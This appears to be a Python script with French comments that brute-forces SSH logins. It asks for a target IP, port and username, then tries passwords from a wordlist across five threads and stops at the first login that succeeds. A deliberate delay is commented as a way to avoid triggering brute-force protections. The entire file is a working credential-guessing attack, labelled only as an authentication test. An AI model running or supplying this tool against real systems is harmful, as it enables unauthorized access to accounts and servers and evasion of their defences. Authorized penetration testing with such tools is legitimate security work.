import paramiko
import time
import threading
from queue import Queue, Empty
from halo import Halo

# Fonction pour tester l'authentification SSH
def test_ssh_authentication(ip, port, username, password, delay):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=10)
        return True, f"Authentication successful for {username}:{password} on {ip}:{port}"
    except paramiko.AuthenticationException:
        return False, f"Authentication failed for {username}:{password} on {ip}:{port}"
    except Exception as e:
        return False, f"Error occurred: {e}"
    finally:
        ssh.close()
        time.sleep(delay)  # Delay to prevent triggering brute-force protection mechanisms

# Fonction pour exécuter des tests d'authentification en parallèle
def worker(ip, port, username, password_queue, delay, attempts_tracker, stop_event):
    while not stop_event.is_set():
        try:
            password = password_queue.get_nowait()
        except Empty:
            break

        success, message = test_ssh_authentication(ip, port, username, password, delay)
        with attempts_tracker['lock']:
            attempts_tracker['count'] += 1
        if success:
            print(f"\n\033[1;32m[✔] {message}\033[0m")  # Message de succès en vert
            stop_event.set()  # Stop other threads
            break
        password_queue.task_done()

# Demander l'IP cible à l'utilisateur
print("\n" + "╔" + "═" * 29 + "╗")
print("║ Test d'authentification SSH ║")
print("╚" + "═" * 29 + "╝")
ip = input("\n\033[1;36mEntrez l'IP cible : \033[0m")

# Demander le port avec une valeur par défaut de 22
port_input = input("\033[1;36mEntrez le port (par défaut 22) : \033[0m")
port = int(port_input) if port_input else 22

# Demander le nom d'utilisateur avec une valeur par défaut de 'admin'
username_input = input("\033[1;36mEntrez le nom d'utilisateur (par défaut 'admin') : \033[0m")
username = username_input if username_input else "admin"

# Lire la liste des mots de passe à partir du fichier passwords.txt
with Halo(text='Chargement de la liste des mots de passe', spinner='dots'):
    with open('list/passwords.txt', 'r') as file:
        password_list = [line.strip() for line in file.readlines()]

# Délai entre les tentatives
delay_between_attempts = 2  # 2 seconds delay between attempts

# Création de la queue de mots de passe
password_queue = Queue()
for password in password_list:
    password_queue.put(password)

# Nombre de threads à utiliser
num_threads = 5

# Initialisation du compteur de tentatives et d'un événement d'arrêt
attempts_tracker = {'count': 0, 'lock': threading.Lock()}
stop_event = threading.Event()

# Lancement des tests avec un loader Halo
total_passwords = len(password_list)
spinner = Halo(text=f'Test d\'authentification en cours... Tentatives : 0/{total_passwords}', spinner='dots')
spinner.start()

threads = []
for i in range(num_threads):
    thread = threading.Thread(target=worker, args=(ip, port, username, password_queue, delay_between_attempts, attempts_tracker, stop_event))
    thread.start()
    threads.append(thread)

# Mise à jour continue du nombre de tentatives sur la même ligne
try:
    while any(thread.is_alive() for thread in threads) and not stop_event.is_set():
        with attempts_tracker['lock']:
            spinner.text = f"Test d'authentification en cours... Tentatives : {attempts_tracker['count']}/{total_passwords}"
        time.sleep(0.1)  # Mettre à jour toutes les 0.1 secondes
finally:
    # Attente de la fin de tous les threads
    for thread in threads:
        thread.join()
    if stop_event.is_set():
        spinner.succeed("Test d'authentification réussi.")
    else:
        spinner.fail("Test d'authentification terminé sans succès.")

print("\n>>>>>> Processus terminé.")
